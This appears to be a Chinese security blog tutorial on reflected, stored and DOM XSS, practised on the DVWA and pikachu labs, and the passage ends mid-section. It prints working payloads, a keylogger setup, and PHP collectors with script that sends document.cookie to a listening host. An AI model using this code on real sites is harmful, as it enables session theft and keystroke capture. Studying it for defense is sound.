@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="xss分类 1、反射型xss反射型xss一般出现在URL参数中及网站搜索栏中，由于需要点击包含恶意代码的URL才可以触发，并且只能触发一次，所以也被称为“非持久性xss”。 2、存储型xss存储型xss一出现在网站留言板，评论处，个人资料处，等需要用户可以对网站写入数据的地方。比如一个论坛评论处由于对用户输入过滤不严格，导致攻击者在写入一段窃取cookie的恶意JavaScript代码到评论处，这">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss_cookies">
+<meta property="og:url" content="http://example.com/2019/04/22/xss-cookies/index.html">
+<meta property="og:site_name" content="Erlee">
+<meta property="og:description" content="xss分类 1、反射型xss反射型xss一般出现在URL参数中及网站搜索栏中，由于需要点击包含恶意代码的URL才可以触发，并且只能触发一次，所以也被称为“非持久性xss”。 2、存储型xss存储型xss一出现在网站留言板，评论处，个人资料处，等需要用户可以对网站写入数据的地方。比如一个论坛评论处由于对用户输入过滤不严格，导致攻击者在写入一段窃取cookie的恶意JavaScript代码到评论处，这">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2019/04/22/xss-cookies/xss-cookies/8180316-96af2342beb43d0c.png">
+<meta property="og:image" content="http://example.com/2019/04/22/xss-cookies/xss-cookies/8180316-c87ab4e34b9491a5.png">
+<meta property="og:image" content="http://example.com/2019/04/22/xss-cookies/xss-cookies/8180316-2ac601600d755a9b.png">
+<meta property="og:image" content="http://example.com/2019/04/22/xss-cookies/xss-cookies/8180316-e7629a89e51c0139.png">
+<meta property="og:image" content="http://example.com/2019/04/22/xss-cookies/xss-cookies/8180316-2eed17e6d56b4ee0.png">
+<meta property="og:image" content="http://example.com/2019/04/22/xss-cookies/xss-cookies/8180316-588c56150fecae0d.png">
+<meta property="og:image" content="http://example.com/2019/04/22/xss-cookies/xss-cookies/8180316-219611bbfa6f8fa9.png">
+<meta property="og:image" content="http://example.com/2019/04/22/xss-cookies/xss-cookies/8180316-a4df3a1681e31e8a.png">
+<meta property="og:image" content="http://example.com/2019/04/22/xss-cookies/xss-cookies/8180316-bd1fd334b13d7e2e.png">
+<meta property="og:image" content="http://example.com/2019/04/22/xss-cookies/xss-cookies/2.png">
+<meta property="og:image" content="http://example.com/2019/04/22/xss-cookies/xss-cookies/4.png">
+<meta property="og:image" content="http://example.com/2019/04/22/xss-cookies/xss-cookies/3.png">
+<meta property="og:image" content="http://example.com/2019/04/22/xss-cookies/xss-cookies/5.png">
+<meta property="og:image" content="http://example.com/2019/04/22/xss-cookies/xss-cookies/3.png">
+<meta property="og:image" content="http://example.com/2019/04/22/xss-cookies/xss-cookies/6.png">
+<meta property="og:image" content="http://example.com/2019/04/22/xss-cookies/xss-cookies/7.png">
+<meta property="article:published_time" content="2019-04-22T23:26:00.000Z">
+<meta property="article:modified_time" content="2019-09-11T03:37:10.461Z">
+<meta property="article:author" content="Erlee">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2019/04/22/xss-cookies/xss-cookies/8180316-96af2342beb43d0c.png">
+
+<link rel="canonical" href="http://example.com/2019/04/22/xss-cookies/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>xss_cookies | Erlee</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Erlee</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2019/04/22/xss-cookies/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/erlee.png">
+      <meta itemprop="name" content="Erlee">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Erlee">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          xss_cookies
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-04-22 19:26:00" itemprop="dateCreated datePublished" datetime="2019-04-22T19:26:00-04:00">2019-04-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2019-09-10 23:37:10" itemprop="dateModified" datetime="2019-09-10T23:37:10-04:00">2019-09-10</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/" itemprop="url" rel="index"><span itemprop="name">知识点</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="xss分类"><a href="#xss分类" class="headerlink" title="xss分类"></a>xss分类</h1><hr>
+<p>1、反射型xss<br>反射型xss一般出现在URL参数中及网站搜索栏中，由于需要点击包含恶意代码的URL才可以触发，并且只能触发一次，所以也被称为“非持久性xss”。</p>
+<p>2、存储型xss<br>存储型xss一出现在网站留言板，评论处，个人资料处，等需要用户可以对网站写入数据的地方。比如一个论坛评论处由于对用户输入过滤不严格，导致攻击者在写入一段窃取cookie的恶意JavaScript代码到评论处，这段恶意代码会写入数据库，当其他用户浏览这个写入代码的页面时，网站从数据库中读取恶意代码显示到网页中被浏览器执行，导致用户cookie被窃取，攻击者无需受害者密码即可登录账户。所以也被称作“持久性xss”。持久性xss比反射型xss危害要大的多。</p>
+<p>3、dom型xss<br>DOM xss是基于dom文档对象模型，前端脚本通过dom动态修改页面，由于不与服务端进行交互，而且代码是可见的，从前端获取dom中的数据在本地执行。<br>常见的可以操纵dom的对象：URL，localtion,referrer等</p>
+<p><strong>可能触发DOM型XSS的属性</strong>：</p>
+<p>document.referer属性</p>
+<p>window.name属性</p>
+<p>location属性</p>
+<p>innerHTML属性</p>
+<p>documen.write属性</p>
+<p>······</p>
+<p><strong>利用DOM引发XSS</strong>：</p>
+<p>利用DOM来引发XSS的方法有很多，这里只演示几种。</p>
+<p>利用创建元素createElement()：</p>
+<p>以DVWA反射型XSS为例，先在Kali监听1234端口：</p>
+<p><img src="xss-cookies/8180316-96af2342beb43d0c.png"></p>
+<p> 然后在DVWA中输入：</p>
+<p><img src="xss-cookies/8180316-c87ab4e34b9491a5.png" alt="img"></p>
+<p>在Kali中可看到cookie信息：</p>
+<p><img src="xss-cookies/8180316-2ac601600d755a9b.png" alt="img"></p>
+<p><strong>利用innerHTML：</strong></p>
+<p>用于篡改页面：</p>
+<p><img src="xss-cookies/8180316-e7629a89e51c0139.png" alt="img"></p>
+<p><img src="xss-cookies/8180316-2eed17e6d56b4ee0.png" alt="img"></p>
+<p><strong>利用document.onkeypress：</strong></p>
+<p>即进行键盘记录。</p>
+<p>在Kali的网页根目录下保存Keylogger.js文件：</p>
+<p><img src="xss-cookies/8180316-588c56150fecae0d.png" alt="img"></p>
+<p><strong>访问一下确保可行：</strong></p>
+<p><img src="xss-cookies/8180316-219611bbfa6f8fa9.png" alt="img"></p>
+<p>接着就是将keylogger.php文件也保存在同一个目录来是实现将键盘得到记录保存到本地的keylog.txt文件中，即将接受到的key参数的取值保存到该文件中：</p>
+<p>keylogger.php：</p>
+<p><img src="xss-cookies/8180316-a4df3a1681e31e8a.png" alt="img"></p>
+<p>接着创建一个空的keylog.txt文件，然后赋予相应的可写的权限，这里为了方便就将权限赋给所有的用户：chmod 777 keylog.txt接着在Kali中打开的DVWA中输入：然后在该网页中随意输入内容，查看keylog.txt文件可看到记录了下来：</p>
+<p><img src="xss-cookies/8180316-bd1fd334b13d7e2e.png" alt="img"></p>
+<p>使用<code>document.write</code>直接输出导致浏览器解析恶意代码</p>
+<p> 测试代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">        var s=location.search;          //返回URL中的查询部分（？之后的内容）</span><br><span class="line">          s=s.substring(1,s.length);    //返回整个查询内容</span><br><span class="line">        var url=&quot;&quot;;                     //定义变量url</span><br><span class="line">        if(s.indexOf(&quot;url=&quot;)&gt;-1)&#123;       //判断URL是否为空 </span><br><span class="line">          var pos=s.indexOf(&quot;url=&quot;)+4;  //过滤掉&quot;url=&quot;字符</span><br><span class="line">          url=s.substring(pos,s.length); //得到地址栏里的url参数</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">          url=&quot;url参数为空&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        document.write(&quot;url: &lt;a href=&#x27;&quot;+url+&quot;&#x27;&gt;&quot;+url+&quot;&lt;/a&gt;&quot;);  //输出</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p> 根据代码可以看出，<code>javascript</code>仅是验证<code>url</code>参数是否存在，如果存在将获取url参数的所有内容并打印出一个a标签，payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload1：http://127.0.0.1/xsstest.html?url=&#x27;&lt;script&gt;alert(&#x27;xsstest&#x27;)&lt;/script&gt;</span><br><span class="line">payload2：http://127.0.0.1/xsstest.html?url=&lt;script&gt;alert(&#x27;xsstest&#x27;)&lt;/script&gt;</span><br><span class="line">payload3：http://127.0.0.1/xsstest.html?url=javascript:alert(/xsstest/) （点击触发）</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>innerHTML</code><strong>直接输出导致浏览器解析恶意代码</strong></p>
+<p> 测试代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">  &lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">      &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">      &lt;title&gt;&lt;/title&gt;</span><br><span class="line">      &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">          var s=location.search;          //返回URL中的查询部分（？之后的内容）</span><br><span class="line">            s=s.substring(1,s.length);    //返回整个查询内容</span><br><span class="line">          var url=&quot;&quot;;                     //定义变量url</span><br><span class="line">          if(s.indexOf(&quot;url=&quot;)&gt;-1)&#123;       //判断URL是否为空</span><br><span class="line">            var pos=s.indexOf(&quot;url=&quot;)+4;  //过滤掉&quot;url=&quot;字符</span><br><span class="line">            url=s.substring(pos,s.length); //得到地址栏里的url参数</span><br><span class="line">          &#125;else&#123;</span><br><span class="line">            url=&quot;url参数为空&quot;;</span><br><span class="line">          &#125;</span><br><span class="line">      &lt;/script&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">      &lt;span id=&#x27;test&#x27;&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">       &lt;script type=&quot;text/javascript&quot;&gt;document.getElementById(&quot;test&quot;).innerHTML=&quot;我的url是: &lt;a href=&#x27;&quot;+url+&quot;&#x27;&gt;&quot;+url+&quot;&lt;/a&gt;&quot;; &lt;/script&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">  &lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p> payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1：http://127.0.0.1/xsstest2.html?url=&#x27;&lt;img src=&quot;x&quot;&gt;&lt;/img&gt;</span><br><span class="line">payload2：http://127.0.0.1/xsstest2.html?url=javascript:alert(/xsstest/) （点击触发）</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用<code>location/location.href/location.replace/iframe.src</code>造成的XSS</strong></p>
+<p> 测试代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">     &lt;html&gt;</span><br><span class="line">       &lt;head&gt;</span><br><span class="line">         &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">         &lt;title&gt;&lt;/title&gt;</span><br><span class="line">         &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">             var s=location.search;          //返回URL中的查询部分（？之后的内容）</span><br><span class="line">               s=s.substring(1,s.length);    //返回整个查询内容</span><br><span class="line">             var url=&quot;&quot;;                     //定义变量url</span><br><span class="line">             if(s.indexOf(&quot;url=&quot;)&gt;-1)&#123;       //判断URL是否为空</span><br><span class="line">               var pos=s.indexOf(&quot;url=&quot;)+4;  //过滤掉&quot;url=&quot;字符</span><br><span class="line">               url=s.substring(pos,s.length); //得到地址栏里的url参数</span><br><span class="line">             // &#125;else&#123;                        //此处注释掉</span><br><span class="line">             //   url=&quot;url参数为空&quot;;          //此处注释掉</span><br><span class="line">              &#125;</span><br><span class="line">         &lt;/script&gt;</span><br><span class="line">       &lt;/head&gt;</span><br><span class="line">       &lt;body&gt;</span><br><span class="line">         &lt;span id=&#x27;test&#x27;&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">          &lt;script type=&quot;text/javascript&quot;&gt;location.href=url&lt;/script&gt;</span><br><span class="line">       &lt;/body&gt;</span><br><span class="line">     &lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p> payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xsstest3.html?url=javascript:alert</span><br><span class="line">http://127.0.0.1/xsstest3.html?url=javascript:alert(/xsstest/)</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用<code>setTimeout/setInterval</code>造成的XSS</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">       &lt;html&gt;</span><br><span class="line">         &lt;head&gt;</span><br><span class="line">           &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">           &lt;title&gt;&lt;/title&gt;</span><br><span class="line">           &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">               var s=location.search;          //返回URL中的查询部分（？之后的内容）</span><br><span class="line">                 s=s.substring(1,s.length);    //返回整个查询内容</span><br><span class="line">               var url=&quot;&quot;;                     //定义变量url</span><br><span class="line">               if(s.indexOf(&quot;url=&quot;)&gt;-1)&#123;       //判断URL是否为空</span><br><span class="line">                 var pos=s.indexOf(&quot;url=&quot;)+4;  //过滤掉&quot;url=&quot;字符</span><br><span class="line">                 url=s.substring(pos,s.length); //得到地址栏里的url参数</span><br><span class="line">                 &#125;else&#123;</span><br><span class="line">                   url=&quot;url参数为空&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">           &lt;/script&gt;</span><br><span class="line">         &lt;/head&gt;</span><br><span class="line">         &lt;body&gt;</span><br><span class="line">           &lt;textarea id=&quot;test&quot; rows=&quot;8&quot; cols=&quot;40&quot;&gt;2s获取url&lt;/textarea&gt;</span><br><span class="line">           &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">              function showURL(url)&#123;</span><br><span class="line">                document.getElementById(&#x27;test&#x27;).value=url;</span><br><span class="line">              &#125;</span><br><span class="line">              if(url!=&quot;url参数为空&quot;)</span><br><span class="line">              setTimeout(&quot;showURL(&#x27;&quot;+url+&quot;&#x27;)&quot;,2000);</span><br><span class="line">                   //setInterval(&quot;showURL(&#x27;&quot;+url+&quot;&#x27;)&quot;,3000);</span><br><span class="line">           &lt;/script&gt;</span><br><span class="line">         &lt;/body&gt;</span><br><span class="line">       &lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p> payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xsstest4.html?url=&#x27;);alert(&quot;xsstest&quot;);eval(&#x27;</span><br></pre></td></tr></table></figure>
+
+<p> 打开payload时，setTimeout内的代码被改写为<code>setTimeout(&quot;showURL(&#39;&quot;&#39;);alert(&#39;xsstest&#39;);eval(&#39;+url+&quot;&#39;)&quot;,2000);</code></p>
+<p> 除了以上说明的几点，还有eval()函数，eval函数将执行其中的的 JavaScript 代码</p>
+<p><strong>DOM型XSS的防御方法</strong></p>
+<p>DOM型XSS主要是由客户端的脚本通过DOM动态地 输出数据到页面而不是依赖于将数据提交给服务器端，而从客户端获得DOM中的数据在本地执行，因而仅从服务器端是无法防御的。其防御在于：</p>
+<p>（1） 避免客户端文档重写、重定向或其他敏感操作，同时避免使用客户端数据，这些操作尽量在服务器端使用动态页面来实现；</p>
+<p>（2） 分析和强化客户端JS代码，特别是受到用户影响的DOM对象，注意能直接修改DOM和创建HTML文件的相关函数或方法，并在输出变量到页面时先进行编码 转义，如输出到HTML则进行HTML编码、输出到js则进行js编码</p>
+<h1 id="xss-Cookie获取"><a href="#xss-Cookie获取" class="headerlink" title="xss Cookie获取"></a>xss Cookie获取</h1><hr>
+<p><strong>先来了解一下cookie属性：name、value、expires、domain、path、secure、max-age、HttpOnly。</strong></p>
+<ul>
+<li><p><strong>name name</strong></p>
+<p>属性是必需的，它是一个键值对，用于指定Cookie的键。</p>
+</li>
+<li><p><strong>value value</strong></p>
+<p>属性是必需的，它是一个键值对，用于指定Cookie的值。expires</p>
+</li>
+<li><p><strong>expires</strong> </p>
+<p>属性用于指定Cookie过期时间。它采用UTC或GMT格式，比如通过new</p>
+<p>date().toUTCString()或new Date().toGMTString()获取到的Thu, 09 Aug 2018 03:17:40 GMT。 如果不设置该属性，或者设为null，Cookie只在当前会话（session）有效，浏览器窗口一旦关闭，当前Session结束，该Cookie就会被删除。 浏览器根据本地时间，决定Cookie是否过期，由于本地时间是不精确的，所以没有办法保证Cookie一定会在服务器指定的时间过期</p>
+</li>
+<li><p><strong>domain</strong><br>domain属性指定Cookie所在的域名，比如example.com或subdomain.example.com。 如果未指定，默认为设定该Cookie的域名。所指定的域名必须是当前发送Cookie的域名的一部分，比如当前访问的域名是example.com，就不能将其设为google.com。只有访问的域名匹配domain属性，Cookie才会发送到服务器。</p>
+</li>
+<li><p><strong>path</strong><br>path属性用来指定路径，必须是绝对路径（比如/、/mydir），如果未指定，默认为请求该Cookie的网页路径。 只有path属性匹配向服务器发送的路径，Cookie才会发送。这里的匹配不是绝对匹配，而是从根路径开始，只要path属性匹配发送路径的一部分，就可以发送。比如，path属性等于/blog，则发送路径是/blog或者/blogroll，Cookie都会发送。path属性生效的前提是domain属性匹配。</p>
+</li>
+<li><p><strong>secure</strong><br>secure属性用来指定Cookie只能在加密协议HTTPS下发送到服务器。 该属性只是一个开关，不需要指定值。如果通信是HTTPS协议，该开关自动打开。</p>
+</li>
+<li><p><strong>max-age</strong> </p>
+<p>max-age属性用来指定Cookie有效期，比如60 * 60 * 24 * 365 （即一年31536000秒） 正常情况下，max-age的优先级高于expires，但是二者有一些细微差别。</p>
+</li>
+<li><p><strong>HttpOnly</strong><br>HttpOnly属性用于设置该Cookie不能被JavaScript读取. （即document.cookie不会返回这个Cookie的值），只用于向服务器发送。 <code>Set-Cookie: key=value; HttpOnly</code> </p>
+</li>
+</ul>
+<p>首先我们需要一段php 代码来获取cookie以及ip并且生成一个cookie.txt文件</p>
+<p>cookie.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cookie = $_GET[&#x27;cookie&#x27;];</span><br><span class="line">$ip = getenv (&#x27;REMOTE_ADDR&#x27;);</span><br><span class="line">$time = date(&#x27;Y-m-d g:i:s&#x27;);</span><br><span class="line">$fp = fopen(&quot;cookie.txt&quot;,&quot;a&quot;);</span><br><span class="line">fwrite($fp,&quot;IP: &quot;.$ip.&quot;Date: &quot;.$time.&quot; Cookie:&quot;.$cookie.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line">?&gt;   </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在存在XSS的地方 这样书 这样书写 (加入getcookie.php在你的根目录)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://127.0.0.1/cookie.php?cookie=&#x27;+document.cookie+&#x27;&quot; width=0 height=0&lt;/script&gt;;</span><br></pre></td></tr></table></figure>
+
+<p>当加号被过滤时</p>
+<p>cookie.js</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var img = document.createElement(&#x27;img&#x27;);</span><br><span class="line">img.width = 0;</span><br><span class="line">img.height = 0;</span><br><span class="line">img.src = &#x27;http://127.0.0.1/coookie.php?joke=&#x27;+encodeURIComponent(document.cookie);</span><br></pre></td></tr></table></figure>
+
+<p>getcookie.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    @ini_set(&#x27;display_errors&#x27;,1);</span><br><span class="line">    $str = $_GET[&#x27;joke&#x27;];</span><br><span class="line">    $filePath = &quot;cookie.txt&quot;;</span><br><span class="line"></span><br><span class="line">    if(is_writable($filePath)==false)&#123;</span><br><span class="line">         echo &quot;can&#x27;t write&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">          $handler = fopen($filePath, &quot;a&quot;);</span><br><span class="line">          fwrite($handler, $str.&quot;\n&quot;);</span><br><span class="line">          fclose($handler);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>构造：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://127.0.0.1/cookie.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="pikachu-xss-之js输出"><a href="#pikachu-xss-之js输出" class="headerlink" title="pikachu xss 之js输出"></a>pikachu xss 之js输出</h5><p>先试一下 <script>alert(1)</script></p>
+<p>果然没有输出，查看元素也没有，然后正常输如看下  输入&lt;1213456&gt;</p>
+<p><img src="xss-cookies/2.png"></p>
+<p>考虑闭合语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;alert(document.cookie)// 可以弹出</span><br></pre></td></tr></table></figure>
+
+<p>获取cookie </p>
